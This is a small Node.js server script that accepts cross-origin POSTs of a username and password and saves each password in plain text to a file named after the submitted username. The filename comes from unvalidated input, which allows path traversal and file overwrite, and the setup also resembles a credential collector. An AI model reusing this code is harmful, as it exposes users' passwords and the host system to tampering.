var http=require('http')
var querystring=require('querystring')
var fs=require('fs')

http.createServer(function(req,res){
	res.setHeader('Access-Control-Allow-Origin','*')
	var str=''
	req.on('data',function(da){
		str+=da
	})
	req.on('end',function(){
		var json=querystring.parse(str)
		fs.writeFile(json.user+'.txt',json.pass,function(err){
			if(err){
				console.log(err)
			}
			console.log('ok')
			res.write('ok')
			res.end()
		})
	})
}).listen(8004)
